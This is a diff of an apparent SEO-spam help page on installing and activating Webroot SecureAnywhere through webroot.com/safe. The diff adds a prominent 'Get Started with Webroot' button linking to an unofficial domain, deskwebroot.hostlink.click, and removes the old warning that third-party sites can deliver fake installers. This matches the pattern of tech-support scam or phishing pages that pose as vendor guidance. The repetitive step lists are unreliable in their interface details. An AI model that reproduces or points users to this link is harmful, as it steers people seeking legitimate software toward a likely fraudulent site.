@@ -1,60 +1,51 @@
-How Do I Setup My Webroot Products Using webroot.com/safe Secure Activate
-=================================================================
+How to Install Webroot Already Purchased
+========================================
+<div style="text-align: center; margin-top: 20px;">
+  <a href="https://deskwebroot.hostlink.click/" target="_blank" style="background-color: #28a745; color: white; padding: 14px 28px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 16px;">
+    Get Started with Webroot
+  </a>
+</div>
 
-Activating your Webroot antivirus is quick and hassle-free. To get started, simply visit  
-`webroot.com/safe <https://www.webroot.com/safe>`_ and follow a few straightforward steps.  
-You’ll use your 20-character product key to **Install Webroot SecureAnywhere**, ensuring your device is protected from viruses, malware, and other online threats.
+If you've already purchased a Webroot subscription and are wondering how to set it up, you're in the right place. The official installation process is straightforward and begins by visiting `webroot.com/safe <https://www.webroot.com/safe>`_. From there, you can **Install Webroot Already Purchased** using your 20-character keycode to ensure your PC or Mac is protected immediately. This guide outlines clear, step-by-step instructions to help you install and activate your Webroot SecureAnywhere software quickly and correctly.
 
-This guide outlines the key steps to help you download, install, and activate Webroot SecureAnywhere securely and correctly.
+How to Install Webroot Already Purchased
+----------------------------------------
 
-Steps to Install Webroot SecureAnywhere
----------------------------------------
+1. Turn on your device and connect it to the internet.
+2. Open your preferred web browser (Chrome, Firefox, Edge, etc.).
+3. Go to `webroot.com/safe <https://www.webroot.com/safe>`_.
+4. Enter your 20-character Webroot keycode found in your purchase email or retail card.
+5. Click the **Next** button to proceed.
+6. Download the Webroot SecureAnywhere installer for your operating system.
+7. Once downloaded, open the installer file (e.g., ``wsainstall.exe``).
+8. Follow the on-screen prompts to begin the installation.
+9. Re-enter your keycode when prompted during installation.
+10. Complete setup and allow the software to perform its first system scan.
 
-1. **Open a web browser** and go to  
-   `webroot.com/safe <https://www.webroot.com/safe>`_
+How to Install Webroot SecureAnywhere using webroot.com/safe
+-------------------------------------------------------------
 
-2. **Enter your 20-character Webroot keycode**, which can be found in your purchase confirmation email or printed on the card inside your retail box.
+1. Visit `webroot.com/safe <https://www.webroot.com/safe>`_ using your browser.
+2. Type in your 20-character Webroot keycode carefully and without spaces.
+3. Click on the **Next** button to access the download page.
+4. Select the download option suitable for your device (Windows or macOS).
+5. Save the installer file to your desktop or Downloads folder.
+6. Double-click the installer file to start installation.
+7. Follow the step-by-step prompts on the installation wizard.
+8. Allow Webroot to make changes to your system if prompted by your OS.
+9. Wait for the installation to finish and for the program to launch.
+10. Webroot will now automatically run a full system scan.
 
-3. Click **Next** to continue to the download section.
+How to Activate Webroot SecureAnywhere using webroot.com/safe
+--------------------------------------------------------------
 
-4. **Download the Webroot SecureAnywhere installer** (this file is usually named ``wsainstall.exe``).
-
-5. Save the file, then run it to begin installation.
-
-During Installation and Activation
-----------------------------------
-
-- When prompted during setup, **enter the same Webroot keycode** once again.
-
-- The installer will automatically validate your subscription and **Install Webroot SecureAnywhere** on your system.
-
-- Once activated, the software will launch and perform an **initial system scan** to check for any existing threats.
-
-- You can customize your security preferences or stick with the default settings recommended by Webroot.
-
-Why Use webroot.com/safe?
---------------------------
-
-Visiting  
-`webroot.com/safe <https://www.webroot.com/safe>`_  
-is the official and safest method to **Install Webroot SecureAnywhere** on your device. Using unauthorized or third-party websites can result in fake installers or invalid key issues.
-
-Tips for a Smooth Installation
-------------------------------
-
-- Ensure a stable internet connection during installation.
-
-- Temporarily disable any conflicting antivirus software.
-
-- Run the installer with administrator privileges for a smoother setup process.
-
-- Keep your keycode safe for future installations or renewals.
-
-Post-Installation Suggestions
------------------------------
-
-- Enable real-time protection in the Webroot dashboard.
-
-- Schedule automatic scans to run weekly.
-
-- Set up your **Webroot account** to manage multiple devices and view your security status remotely.
+1. After installing the program, open Webroot SecureAnywhere.
+2. Click on the **gear icon** in the bottom right to access settings.
+3. Navigate to the **Activation** or **Subscription** tab.
+4. Enter your 20-character keycode in the space provided.
+5. Click the **Activate** or **Submit** button.
+6. Webroot will verify your keycode and activate your subscription.
+7. If valid, your protection status will update immediately.
+8. Review your subscription expiry date in the dashboard.
+9. Customize your scan schedule and security settings if needed.
+10. Confirm activation success via the Webroot status bar.
